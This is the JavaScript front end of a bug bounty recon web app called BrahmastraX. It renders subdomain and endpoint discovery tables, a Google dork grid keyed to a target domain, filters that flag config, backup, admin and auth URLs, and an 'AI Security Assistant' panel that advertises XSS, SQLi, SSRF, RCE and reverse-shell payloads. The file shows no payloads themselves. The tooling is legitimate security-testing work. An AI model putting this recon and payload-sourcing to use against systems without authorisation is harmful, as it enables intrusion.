function initCanvas() {
  const c=document.getElementById("bg-canvas");
  if (!c) return;
  const ctx=c.getContext("2d");
  let W,H,cols,drops,particles;

  const MAX_PARTICLES = 35;
  const CONNECT_DIST = 100;
  const CONNECT_DIST_SQ = CONNECT_DIST * CONNECT_DIST;

  function resize() {
    W=c.width=innerWidth; H=c.height=innerHeight;
    cols=Math.floor(W/22);
    drops=Array(cols).fill(null).map(()=>Math.random()*-50);
    if (!particles) particles=[];
    while(particles.length<MAX_PARTICLES) particles.push(mkParticle());
    particles=particles.slice(0,MAX_PARTICLES);
    particles.forEach(p=>{p.x=Math.random()*W;p.y=Math.random()*H;});
  }

  function mkParticle() {
    return {
      x:Math.random()*(W||1920), y:Math.random()*(H||1080),
      vx:(Math.random()-.5)*.3, vy:(Math.random()-.5)*.3,
      r:Math.random()*2+1,
      col:Math.random()>.6?"139,92,246":"99,179,255",
      alpha:Math.random()*.4+.15,
    };
  }

  resize();
  window.addEventListener("resize",resize);

  const CHARS="01<>{}ABCDEF01XSS SQL";
  let frame=0;
  let lastTime=0;
  const TARGET_FPS=30;
  const FRAME_MS=1000/TARGET_FPS;

  function loop(ts) {
    requestAnimationFrame(loop);
    if (ts-lastTime < FRAME_MS) return;
    lastTime=ts;
    frame++;

    ctx.fillStyle="rgba(2,4,8,0.2)";
    ctx.fillRect(0,0,W,H);

    if (frame%2===0) {
      ctx.font="13px monospace";
      for (let i=0;i<cols;i++) {
        const y=drops[i]*22;
        ctx.fillStyle="rgba(34,211,160,0.65)";
        ctx.fillText(CHARS[Math.floor(Math.random()*CHARS.length)],i*22,y);
        if (y>H&&Math.random()>.978) drops[i]=-Math.floor(Math.random()*20);
        drops[i]+=.5;
      }
    }

    for (const p of particles) {
      p.x+=p.vx; p.y+=p.vy;
      if(p.x<0||p.x>W) p.vx*=-1;
      if(p.y<0||p.y>H) p.vy*=-1;
      ctx.beginPath();
      ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
      ctx.fillStyle=`rgba(${p.col},${p.alpha})`;
      ctx.fill();
    }

    ctx.lineWidth=.5;
    for (let i=0;i<particles.length;i++) {
      for(let j=i+1;j<particles.length;j++) {
        const dx=particles[i].x-particles[j].x;
        const dy=particles[i].y-particles[j].y;
        const distSq=dx*dx+dy*dy;
        if (distSq<CONNECT_DIST_SQ) {
          const alpha=.07*(1-Math.sqrt(distSq)/CONNECT_DIST);
          ctx.beginPath();
          ctx.moveTo(particles[i].x,particles[i].y);
          ctx.lineTo(particles[j].x,particles[j].y);
          ctx.strokeStyle=`rgba(99,179,255,${alpha})`;
          ctx.stroke();
        }
      }
    }
  }
  requestAnimationFrame(loop);
}

/* ══════════════════════════════════════════════
   CUSTOM CURSOR ANIMATION
   Moving: hex trail particles
   Idle: pulsing scan ring animation
   ══════════════════════════════════════════════ */
function initCursor() {
  const dot = document.getElementById("cursor-dot");
  const ring = document.getElementById("cursor-ring");
  const idleRing = document.getElementById("cursor-idle-ring");
  const trailCanvas = document.getElementById("cursor-trail-canvas");
  if (!dot || !ring || window.innerWidth < 768) return;

  const ctx = trailCanvas.getContext("2d");
  trailCanvas.width = window.innerWidth;
  trailCanvas.height = window.innerHeight;
  window.addEventListener("resize", () => {
    trailCanvas.width = window.innerWidth;
    trailCanvas.height = window.innerHeight;
  });

  let mx = -200, my = -200;
  let lastMx = -200, lastMy = -200;
  let idleTimer = null;
  let isIdle = false;
  const trails = [];

  // Hex characters for trail
  const HEX_CHARS = "0123456789ABCDEF<>{}XSS$?#@!%";

  const MAX_TRAILS = 40;
  let trailLastTime = 0;
  const TRAIL_FRAME_MS = 1000 / 30;

  function spawnTrail(x, y) {
    if (trails.length >= MAX_TRAILS) return;
    trails.push({
      x: x + (Math.random() - .5) * 6,
      y: y + (Math.random() - .5) * 6,
      char: HEX_CHARS[Math.floor(Math.random() * HEX_CHARS.length)],
      size: Math.random() * 5 + 7,
      vy: (Math.random() - .5) * 1.2,
      vx: (Math.random() - .5) * 1.2,
      life: 1.0,
      decay: Math.random() * 0.06 + 0.03,
      color: Math.random() > 0.5 ? "34,211,160" : "99,179,255",
    });
  }

  function drawTrails(ts) {
    requestAnimationFrame(drawTrails);
    if (ts - trailLastTime < TRAIL_FRAME_MS) return;
    trailLastTime = ts;
    ctx.clearRect(0, 0, trailCanvas.width, trailCanvas.height);
    ctx.font = "11px monospace";
    for (let i = trails.length - 1; i >= 0; i--) {
      const t = trails[i];
      t.x += t.vx; t.y += t.vy;
      t.life -= t.decay;
      if (t.life <= 0) { trails.splice(i, 1); continue; }
      ctx.fillStyle = `rgba(${t.color},${t.life * 0.6})`;
      ctx.fillText(t.char, t.x, t.y);
    }
  }
  requestAnimationFrame(drawTrails);

  document.addEventListener("mousemove", e => {
    mx = e.clientX; my = e.clientY;

    // Update cursor positions
    dot.style.left = mx + "px"; dot.style.top = my + "px";
    ring.style.left = mx + "px"; ring.style.top = my + "px";
    idleRing.style.left = mx + "px"; idleRing.style.top = my + "px";

    // Spawn trail if moved enough
    const dx = mx - lastMx, dy = my - lastMy;
    if (dx*dx + dy*dy > 100) {
      spawnTrail(mx, my);
      lastMx = mx; lastMy = my;
    }

    // Reset idle
    if (isIdle) {
      isIdle = false;
      idleRing.classList.remove("scanning");
      dot.style.background = "var(--green)";
      dot.style.width = "6px"; dot.style.height = "6px";
    }
    clearTimeout(idleTimer);
    idleTimer = setTimeout(() => {
      isIdle = true;
      idleRing.style.left = mx + "px"; idleRing.style.top = my + "px";
      idleRing.classList.add("scanning");
      dot.style.background = "var(--cyan)";
      dot.style.width = "8px"; dot.style.height = "8px";
    }, 2000);
  });

  // Click effect
  document.addEventListener("click", e => {
    for (let i = 0; i < 3; i++) spawnTrail(e.clientX, e.clientY);
    ring.style.width = "45px"; ring.style.height = "45px";
    ring.style.borderColor = "rgba(34,211,160,0.8)";
    setTimeout(() => {
      ring.style.width = "28px"; ring.style.height = "28px";
      ring.style.borderColor = "rgba(99,179,255,0.5)";
    }, 200);
  });
}

/* ── TOAST ── */
let toastT;
function showToast(msg,type="success") {
  clearTimeout(toastT);
  const el=document.getElementById("toast");
  const iconEl=document.getElementById("toast-icon");
  const msgEl=document.getElementById("toast-msg");
  if (iconEl) iconEl.textContent=type==="success"?"✓":"✕";
  if (msgEl) msgEl.textContent=msg;
  el.className=`toast show ${type}`;
  toastT=setTimeout(()=>{el.className="toast";},3200);
}

/* ── SVG ICONS ── */
const IC={
  search:`<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>`,
  copy:`<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>`,
  dl:`<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>`,
  filter:`<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3"/></svg>`,
  extlink:`<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="opacity:.4"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>`,
  github:`<svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.3 3.44 9.8 8.21 11.39.6.11.82-.26.82-.58v-2.03c-3.34.72-4.04-1.61-4.04-1.61-.55-1.38-1.34-1.75-1.34-1.75-1.09-.74.08-.73.08-.73 1.2.09 1.84 1.24 1.84 1.24 1.07 1.83 2.81 1.3 3.5 1 .11-.78.42-1.3.76-1.6-2.67-.3-5.47-1.33-5.47-5.93 0-1.31.47-2.38 1.24-3.22-.12-.3-.54-1.52.12-3.18 0 0 1.01-.32 3.3 1.23a11.5 11.5 0 0 1 3-.4c1.02.01 2.04.14 3 .4 2.29-1.55 3.3-1.23 3.3-1.23.66 1.66.24 2.88.12 3.18.77.84 1.24 1.91 1.24 3.22 0 4.61-2.81 5.63-5.48 5.92.43.37.81 1.1.81 2.22v3.29c0 .32.22.7.83.58C20.56 21.8 24 17.3 24 12c0-6.63-5.37-12-12-12z"/></svg>`,
  medium:`<svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M13.54 12a6.8 6.8 0 0 1-6.77 6.82A6.8 6.8 0 0 1 0 12a6.8 6.8 0 0 1 6.77-6.82A6.8 6.8 0 0 1 13.54 12zm7.42 0c0 3.54-1.51 6.42-3.38 6.42-1.87 0-3.39-2.88-3.39-6.42s1.52-6.42 3.39-6.42 3.38 2.88 3.38 6.42M24 12c0 3.17-.53 5.75-1.19 5.75-.66 0-1.19-2.58-1.19-5.75s.53-5.75 1.19-5.75C23.47 6.25 24 8.83 24 12z"/></svg>`,
  linkedin:`<svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>`,
  x:`<svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.748l7.73-8.835L1.254 2.25H8.08l4.259 5.629L18.244 2.25zm-1.161 17.52h1.833L7.084 4.126H5.117L17.083 19.77z"/></svg>`,
  portfolio:`<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="m8 21 4-4 4 4"/><path d="M12 17v4"/></svg>`,
  send:`<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>`,
};

/* ── FILTERS ── */
function filteredSub(){
  return S.subResults.filter(r=>!S.subFilter||r.subdomain.includes(S.subFilter.toLowerCase())||r.ip.includes(S.subFilter));
}
function filteredEp(){
  return S.epResults.filter(r=>{
    const q=S.epFilter.toLowerCase();
    if(q&&!r.url.toLowerCase().includes(q)) return false;
    if(S.epChips.has("js")&&!r.url.match(/\.js(\?|$)/)) return false;
    if(S.epChips.has("config")&&!r.url.match(/\.(env|config|cfg|ini|xml|yaml|yml|bak|backup|sql)(\?|$)/i)) return false;
    if(S.epChips.has("redirect")&&!r.url.match(/redirect|return|next|url=/i)) return false;
    if(S.epChips.has("upload")&&!r.url.match(/upload|file|attach/i)) return false;
    if(S.epChips.has("auth")&&!r.url.match(/auth|login|oauth|token|sso/i)) return false;
    if(S.epChips.has("admin")&&!r.url.match(/admin|panel|manage|dashboard/i)) return false;
    if(S.epChips.has("api")&&!r.url.match(/\/api\/|\/v[0-9]+\/|rest|graphql/i)) return false;
    if(S.epChips.has("params")&&!r.url.includes("?")) return false;
    return true;
  });
}

function statusBadgeH(s) {
  const n=parseInt(s);
  if (!n) return `<span style="color:var(--muted);font-size:12px">—</span>`;
  const cls=n>=200&&n<300?"status-2xx":n>=300&&n<400?"status-3xx":n>=400&&n<500?"status-4xx":"status-5xx";
  return `<span class="status-badge ${cls}">${s}</span>`;
}

function buildDork(tmpl) {
  const d=(S.dorkDomain.trim().replace(/^https?:\/\//,"").replace(/\/.*/,""))||"example.com";
  return tmpl.replace(/\{domain\}/g,d);
}

/* ── TABLE ROW HTML ── */
function subRows(list) {
  if (!list.length) return `<tr><td colspan="5"><div class="empty-state"><div class="empty-icon">◎</div><p>Enter a domain above and click <strong>Scan</strong><br/>to begin subdomain discovery.</p></div></td></tr>`;
  const visible=list.slice(0,(S.subPage+1)*PAGE);
  const rem=list.length-(S.subPage+1)*PAGE;
  let out=visible.map((r,i)=>{
    const parts=r.subdomain.split(".");
    const sub=parts.length>2?`<span class="highlight">${parts.slice(0,-2).join(".")}</span>.${parts.slice(-2).join(".")}`:`<span class="highlight">${r.subdomain}</span>`;
    const ip=r.ip?`<span class="ip-pill">${r.ip}</span>`:`<span style="color:var(--muted)">—</span>`;
    const st=r.ip?`<span class="status-pill resolved"><span class="status-dot"></span>Resolved</span>`:`<span class="status-pill none"><span class="status-dot"></span>—</span>`;
    return `<tr><td class="td-index">${i+1}</td><td class="td-sub"><a class="sub-link" href="https://${r.subdomain}" target="_blank" rel="noopener">${sub} ${IC.extlink}</a></td><td class="td-ip">${ip}</td><td><span class="source-badge ${r.source}">${SRC_LABELS[r.source]||r.source}</span></td><td>${st}</td></tr>`;
  }).join("");
  if (rem>0) out+=`<tr><td colspan="5" style="padding:14px 0"><button class="show-more-btn" id="sub-more">Show ${Math.min(rem,PAGE)} more (${rem} remaining)</button></td></tr>`;
  return out;
}
function epRows(list) {
  if (!list.length) return `<tr><td colspan="4"><div class="empty-state"><div class="empty-icon">◎</div><p>Enter a domain above and click <strong>Scan</strong><br/>to start endpoint discovery.</p></div></td></tr>`;
  const visible=list.slice(0,(S.epPage+1)*EP_PAGE);
  const rem=list.length-(S.epPage+1)*EP_PAGE;
  let out=visible.map((r,i)=>`<tr><td class="td-index">${i+1}</td><td class="ep-url-cell"><a href="${r.url}" target="_blank" rel="noopener">${r.url}</a></td><td>${statusBadgeH(r.status)}</td><td><span class="source-badge ${r.source}">${SRC_LABELS[r.source]||r.source}</span></td></tr>`).join("");
  if (rem>0) out+=`<tr><td colspan="4" style="padding:14px 0"><button class="show-more-btn" id="ep-more">Show ${Math.min(rem,EP_PAGE)} more (${rem} remaining)</button></td></tr>`;
  return out;
}

/* ── PROGRESS HTML ── */
function progH(status,pct) {
  return `<div class="progress-wrap">
    <div class="progress-header"><div class="progress-title"><span class="spinner"></span>Scanning sources…</div><span class="progress-pct">${pct}%</span></div>
    <div class="progress-bar-bg"><div class="progress-bar-fill" style="width:${pct}%"></div></div>
    <div class="source-status">${Object.entries(status).map(([k,v])=>{
      const ex=v.state==="done"?` (${v.count})`:v.state==="error"?" — failed":v.state==="quota"?" — rate limited":"";
      return `<div class="src-item ${v.state}"><div class="src-dot"></div><span>${SRC_LABELS[k]||EP_LABELS[k]||k}${ex}</span></div>`;
    }).join("")}</div>
  </div>`;
}

/* ── DORK GRID HTML ── */
function dorkGrid() {
  const q=S.dorkSearch.toLowerCase();
  const cats=DORK_CATEGORIES.map(c=>({...c,dorks:c.dorks.filter(d=>!q||d.label.toLowerCase().includes(q)||d.query.toLowerCase().includes(q))})).filter(c=>c.dorks.length>0);
  if (!cats.length) return `<div class="empty-state"><div class="empty-icon">🔍</div><p>No dorks match your search.</p></div>`;
  const visibleDorks=cats.reduce((a,c)=>a+c.dorks.length,0);
  return `<div class="dork-stats-bar">
    <span class="dork-stat-item"><strong>${visibleDorks}</strong> dorks</span>
    <span class="dork-stat-sep">·</span>
    <span class="dork-stat-item"><strong>${cats.length}</strong> categories</span>
    <span class="dork-stat-sep">·</span>
    <span class="dork-stat-item">Total: <strong>${TOTAL_DORKS}</strong> dorks available</span>
  </div>
  <div class="dork-grid">${cats.map(cat=>`
    <div class="dork-category">
      <div class="dork-category-title">
        <span class="dork-cat-emoji" style="background:${cat.color};border:1px solid ${cat.border}">${cat.emoji}</span>
        ${cat.title}
      </div>
      <div class="dork-category-desc">${cat.dorks.length} dork${cat.dorks.length>1?'s':''} available</div>
      <div class="dork-items">
        ${cat.dorks.map((d,i)=>`
          <div class="dork-item">
            <div class="dork-item-left">
              <div class="dork-item-label" style="color:${cat.textColor}">${d.label}</div>
              <div class="dork-query" data-cat="${cat.id}" data-i="${i}" title="Click to copy">${escHtml(buildDork(d.query))}</div>
            </div>
            <div class="dork-btns">
              <button class="dork-run-btn" data-cat="${cat.id}" data-i="${i}">${IC.search} Search</button>
              <button class="dork-copy-btn" data-cat="${cat.id}" data-i="${i}">${IC.copy}</button>
            </div>
          </div>`).join("")}
      </div>
    </div>`).join("")}</div>`;
}

function subSrcToggles() {
  return Object.keys(S.subSources).map(k=>{
    const on=S.subSources[k]; const st=S.subSrcStatus[k];
    const cnt=(st&&st.state==="done"&&st.count!==undefined)?`<span class="toggle-count">${st.count}</span>`:"";
    return `<label class="source-toggle ${on?"active":""}" data-src="${k}"><input type="checkbox" ${on?"checked":""}/><span class="dot"></span>${SRC_LABELS[k]||k}${cnt}</label>`;
  }).join("");
}
function epSrcToggles() {
  return Object.keys(S.epSources).map(k=>{
    const on=S.epSources[k]; const st=S.epSrcStatus[k];
    const cnt=(st&&st.state==="done"&&st.count!==undefined)?`<span class="toggle-count">${st.count}</span>`:"";
    return `<label class="source-toggle ${on?"active":""}" data-src="${k}"><input type="checkbox" ${on?"checked":""}/><span class="dot"></span>${EP_LABELS[k]||k}${cnt}</label>`;
  }).join("");
}
function epFilterMenuH() {
  if (!S.epFilterOpen) return "";
  const groups=[
    {label:"File Types",items:[["js","JS"],["config","Config / Backup"]]},
    {label:"Security",items:[["redirect","Redirect"],["upload","Upload"],["auth","Auth"],["admin","Admin"]]},
    {label:"Discovery",items:[["api","API"],["params","Has Params"]]},
  ];
  return `<div class="ep-filter-menu" id="epfm">
    ${groups.map(g=>`<div class="ep-filter-group">
      <div class="ep-filter-group-label">${g.label}</div>
      <div class="ep-filter-chips">${g.items.map(([k,l])=>`<button class="ep-chip ${S.epChips.has(k)?"active":""}" data-chip="${k}">${l}</button>`).join("")}</div>
    </div>`).join("")}
    <div class="ep-filter-footer"><button class="ep-filter-clear" id="epfc">Clear all</button></div>
  </div>`;
}

function aiMessagesH() {
  return S.aiMessages.map((msg, i)=>{
    if (msg.role === "bot") {
      return `<div class="ai-msg bot">
        <div class="ai-msg-avatar">🤖</div>
        <div class="ai-msg-bubble">${msg.html}</div>
      </div>`;
    } else {
      return `<div class="ai-msg user">
        <div class="ai-msg-avatar">👤</div>
        <div class="ai-msg-bubble">${escHtml(msg.text)}</div>
      </div>`;
    }
  }).join("") + (S.aiTyping ? `<div class="ai-msg bot"><div class="ai-msg-avatar">🤖</div><div class="ai-msg-bubble"><div style="display:flex;align-items:center;gap:8px"><div class="ai-typing"><span></span><span></span><span></span></div><span style="font-size:11px;color:var(--muted);font-family:var(--mono)">Searching the web...</span></div></div></div>` : "");
}

function footerH() {
  return `<div class="social-footer"><div class="social-footer-inner">
    <span class="social-brand-name">⚔ BrahmastraX</span>
    <div class="social-links">
      <a class="social-link" href="https://github.com/PradyumnTiwareNexus" target="_blank" rel="noopener">${IC.github} GitHub</a>
      <a class="social-link" href="https://pradyumntiwarenexus.medium.com/" target="_blank" rel="noopener">${IC.medium} Medium</a>
      <a class="social-link" href="https://www.linkedin.com/in/pradyumn-tiwarinexus-b270561b1/" target="_blank" rel="noopener">${IC.linkedin} LinkedIn</a>
      <a class="social-link" href="https://x.com/pradyumnTiwari0" target="_blank" rel="noopener">${IC.x} X / Twitter</a>
      <a class="social-link" href="https://pradyumntiwarenexus.github.io/" target="_blank" rel="noopener">${IC.portfolio} Portfolio</a>
    </div>
    <div class="social-copy">© 2026 BrahmastraX · created by pradyumntiwarenexus · ${TOTAL_DORKS}+ Google Dorks · AI Security Assistant</div>
  </div></div>`;
}

/* ── MAIN RENDER ── */
function render() {
  const app=document.getElementById("app");
  const fs=filteredSub(); const fe=filteredEp();
  const subR=S.subResults.filter(r=>r.ip).length;
  const subIP=new Set(S.subResults.filter(r=>r.ip).map(r=>r.ip)).size;
  const subSrc=new Set(S.subResults.map(r=>r.source)).size;
  let html="";

  if (S.tab==="subdomain") {
    html=`
      <div class="hero">
        <h1>BrahmastraX</h1>
        <div class="hero-tagline"><span class="hero-tag">Advanced Recon &amp; Dorking Platform</span></div>
        <div class="hero-tagline" style="margin-top:0">
          <span class="hero-tag">Subdomain Discovery</span><span class="hero-sep">•</span>
          <span class="hero-tag">Endpoint Enumeration</span><span class="hero-sep">•</span>
          <span class="hero-tag">Google Dork Intelligence</span><span class="hero-sep">•</span>
          <span class="hero-tag">AI Security Assistant</span>
        </div>
        <p>BrahmastraX is a powerful bug bounty recon toolkit combining 11 passive intelligence sources with ${TOTAL_DORKS}+ Google dorks and an AI security assistant — no install, no setup, runs in your browser.</p>
        <div class="hero-quote">
          <span class="hero-quote-mark">"</span>${QUOTE.text}<span class="hero-quote-mark">"</span>
          <span class="hero-quote-by">${QUOTE.by}</span>
        </div>
      </div>
      <div class="search-card">
        <div class="input-row">
          <div class="input-wrap">
            <span class="input-icon">⌕</span>
            <input class="domain-input" id="sub-inp" type="text" placeholder="e.g. example.com" value="${S.subDomain}" autocomplete="off" spellcheck="false"/>
          </div>
          <button class="scan-btn" id="sub-btn" ${S.subScanning?"disabled":""}>
            <span class="btn-inner">${S.subScanning?`<span class="spinner"></span> Scanning…`:`${IC.search} Scan`}</span>
          </button>
        </div>
        <div class="source-row" id="sub-src-row">${subSrcToggles()}</div>
      </div>
      <div class="stats-row">
        <div class="stat-card"><div class="stat-label">Subdomains</div><div class="stat-value">${S.subResults.length}</div></div>
        <div class="stat-card"><div class="stat-label">Resolved</div><div class="stat-value">${subR}</div></div>
        <div class="stat-card"><div class="stat-label">Sources Hit</div><div class="stat-value">${subSrc}</div></div>
        <div class="stat-card"><div class="stat-label">Unique IPs</div><div class="stat-value">${subIP}</div></div>
      </div>
      ${S.subShowProgress?progH(S.subSrcStatus,S.subProgress):""}
      <div class="table-section">
        <div class="table-header">
          <div class="section-title">Results <span>${fs.length>0?`(${fs.length})`:""}</span></div>
          <div class="table-actions">
            <input class="filter-input" id="sub-flt" type="text" placeholder="Filter results…" value="${S.subFilter}"/>
            <button class="action-btn" id="sub-cp">${IC.copy} Copy</button>
            <button class="action-btn" id="sub-ex">${IC.dl} Export .txt</button>
          </div>
        </div>
        <div class="table-wrap"><table>
          <thead><tr><th>#</th><th>Subdomain</th><th>IP Address</th><th>Source</th><th>Status</th></tr></thead>
          <tbody id="sub-tb">${subRows(fs)}</tbody>
        </table></div>
      </div>`;
  }
  else if (S.tab==="endpoint") {
    const stats=S.epResults.length?`<div class="stats-row">
      <div class="stat-card"><div class="stat-label">Endpoints Found</div><div class="stat-value">${S.epResults.length}</div></div>
      <div class="stat-card"><div class="stat-label">Sources Hit</div><div class="stat-value">${new Set(S.epResults.map(r=>r.source)).size}</div></div>
      <div class="stat-card"><div class="stat-label">Domain</div><div class="stat-value" style="font-size:1rem;word-break:break-all">${S.epStatsDomain||"—"}</div></div>
    </div>`:"";
    html=`
      <div class="hero" style="padding-bottom:32px">
        <h1 style="font-size:clamp(2rem,6vw,4rem)">Endpoint Recon</h1>
        <div class="hero-tagline">
          <span class="hero-tag">Wayback Machine</span><span class="hero-sep">·</span>
          <span class="hero-tag">Common Crawl</span><span class="hero-sep">·</span>
          <span class="hero-tag">AlienVault OTX</span><span class="hero-sep">·</span>
          <span class="hero-tag">URLScan.io</span>
        </div>
        <p>Discover historical endpoints, URLs and paths from passive web archives — no active scanning, no noise.</p>
      </div>
      <div class="search-card">
        <div class="input-row">
          <div class="input-wrap">
            <span class="input-icon">⌕</span>
            <input class="domain-input" id="ep-inp" type="text" placeholder="e.g. example.com" value="${S.epDomain}" autocomplete="off"/>
          </div>
          <button class="scan-btn" id="ep-btn" ${S.epScanning?"disabled":""}>
            <span class="btn-inner">${S.epScanning?`<span class="spinner"></span> Scanning…`:`${IC.search} Scan`}</span>
          </button>
        </div>
        <div class="source-row" id="ep-src-row">${epSrcToggles()}</div>
      </div>
      ${S.epShowProgress?progH(S.epSrcStatus,S.epProgress):""}
      ${stats}
      <div class="table-section">
        <div class="table-header">
          <div class="section-title">Endpoints <span>${fe.length>0?`(${fe.length})`:""}</span></div>
          <div class="table-actions">
            <div class="ep-filter-wrap" id="epfw">
              <button class="action-btn" id="ep-ftb">${IC.filter} Filters ${S.epChips.size?`<span style="background:var(--cyan);color:#000;border-radius:10px;padding:1px 6px;font-size:10px;font-weight:800">${S.epChips.size}</span>`:""}</button>
              ${epFilterMenuH()}
            </div>
            <input class="filter-input" id="ep-flt" style="width:200px" type="text" placeholder="Filter endpoints…" value="${S.epFilter}"/>
            <button class="action-btn" id="ep-cp">${IC.copy} Copy</button>
            <button class="action-btn" id="ep-ex">${IC.dl} Export .txt</button>
          </div>
        </div>
        <div class="table-wrap"><table>
          <thead><tr><th>#</th><th>URL</th><th>Status</th><th>Source</th></tr></thead>
          <tbody id="ep-tb">${epRows(fe)}</tbody>
        </table></div>
      </div>`;
  }
  else if (S.tab==="dork") {
    html=`
      <div class="hero" style="padding-bottom:32px">
        <h1 style="font-size:clamp(2rem,6vw,4rem)">Google Dork</h1>
        <div class="hero-tagline">
          <span class="hero-tag">${DORK_CATEGORIES.length} Categories</span><span class="hero-sep">·</span>
          <span class="hero-tag">${TOTAL_DORKS}+ Dorks</span><span class="hero-sep">·</span>
          <span class="hero-tag">One-Click Search</span>
        </div>
        <p>Ready-made Google dorks for bug bounty recon. Enter your target, click <strong style="color:var(--cyan)">Search</strong> to run on Google or copy the query.</p>
      </div>
      <div class="dork-search-bar">
        <input class="dork-target-input" id="dk-domain" type="text" placeholder="Target domain (e.g. example.com)" value="${S.dorkDomain}" autocomplete="off"/>
        <input class="dork-search-input" id="dk-search" type="text" placeholder="Search dorks…" value="${S.dorkSearch}"/>
      </div>
      <div id="dork-container">${dorkGrid()}</div>`;
  }
  else if (S.tab==="ai") {
    html=`
      <div class="ai-section">
        <div class="ai-hero">
          <h2>AI Security Assistant</h2>
          <p>Ask me for XSS payloads, SSTI, SQL injection, SSRF, LFI, RCE, XXE, IDOR techniques and more. Runs 100% in your browser.</p>
        </div>
        <div class="ai-quick-btns">
          <button class="ai-quick-btn" data-query="Give me XSS payloads">💉 XSS Payloads</button>
          <button class="ai-quick-btn" data-query="SSTI payloads">🔧 SSTI</button>
          <button class="ai-quick-btn" data-query="SQL injection payloads">🗄️ SQL Injection</button>
          <button class="ai-quick-btn" data-query="SSRF payloads">🌐 SSRF</button>
          <button class="ai-quick-btn" data-query="LFI payloads">📁 LFI/RFI</button>
          <button class="ai-quick-btn" data-query="RCE command injection">💻 RCE</button>
          <button class="ai-quick-btn" data-query="XXE payloads">📄 XXE</button>
          <button class="ai-quick-btn" data-query="IDOR techniques">🔓 IDOR</button>
          <button class="ai-quick-btn" data-query="bug bounty tools">🛠️ Tools</button>
          <button class="ai-quick-btn" data-query="wordlists">📋 Wordlists</button>
        </div>
        <div class="ai-chat-card">
          <div class="ai-chat-header">
            <div class="ai-avatar">🤖</div>
            <div class="ai-header-info">
              <div class="ai-name">BrahmastraX AI</div>
              <div class="ai-status"><span class="ai-status-dot"></span> Online — Ready to hack</div>
            </div>
            <div class="ai-header-badge">Security Intelligence</div>
          </div>
          <div class="ai-messages" id="ai-messages">${aiMessagesH()}</div>
          <div class="ai-input-row">
            <input class="ai-input" id="ai-input" type="text" placeholder="Ask about XSS, SSTI, SQLi, SSRF, LFI, RCE, XXE, IDOR…" value="${S.aiInput}" autocomplete="off"/>
            <button class="ai-send-btn" id="ai-send" ${S.aiTyping?"disabled":""}>
              ${IC.send} Send
            </button>
          </div>
        </div>
        <div class="ai-capabilities">
          <div class="ai-cap-card" data-query="Give me XSS payloads">
            <div class="ai-cap-icon">💉</div>
            <div class="ai-cap-title">XSS Payloads</div>
            <div class="ai-cap-desc">Reflected, Stored, DOM, CSP bypass, Filter evasion</div>
          </div>
          <div class="ai-cap-card" data-query="SSTI payloads">
            <div class="ai-cap-icon">🔧</div>
            <div class="ai-cap-title">SSTI</div>
            <div class="ai-cap-desc">Jinja2, Twig, Freemarker, ERB, Smarty, Velocity</div>
          </div>
          <div class="ai-cap-card" data-query="SQL injection payloads">
            <div class="ai-cap-icon">🗄️</div>
            <div class="ai-cap-title">SQL Injection</div>
            <div class="ai-cap-desc">Error-based, UNION, Blind, Time-based, NoSQL</div>
          </div>
          <div class="ai-cap-card" data-query="SSRF payloads">
            <div class="ai-cap-icon">🌐</div>
            <div class="ai-cap-title">SSRF</div>
            <div class="ai-cap-desc">Cloud metadata, Protocol smuggling, Bypass techniques</div>
          </div>
          <div class="ai-cap-card" data-query="LFI payloads">
            <div class="ai-cap-icon">📁</div>
            <div class="ai-cap-title">LFI / RFI</div>
            <div class="ai-cap-desc">File inclusion, PHP wrappers, Log poisoning</div>
          </div>
          <div class="ai-cap-card" data-query="RCE command injection">
            <div class="ai-cap-icon">💻</div>
            <div class="ai-cap-title">RCE</div>
            <div class="ai-cap-desc">Command injection, Reverse shells, Filter bypass</div>
          </div>
        </div>
      </div>`;
  }

  app.innerHTML=html+footerH();
  bindEvents();
  if (S.tab==="ai") {
    const msgBox = document.getElementById("ai-messages");
    if (msgBox) msgBox.scrollTop = msgBox.scrollHeight;
  }
}

function partialSubTable() {
  const tb=document.getElementById("sub-tb");
  if (tb) tb.innerHTML=subRows(filteredSub());
  document.getElementById("sub-more")?.addEventListener("click",()=>{S.subPage++;partialSubTable();});
}
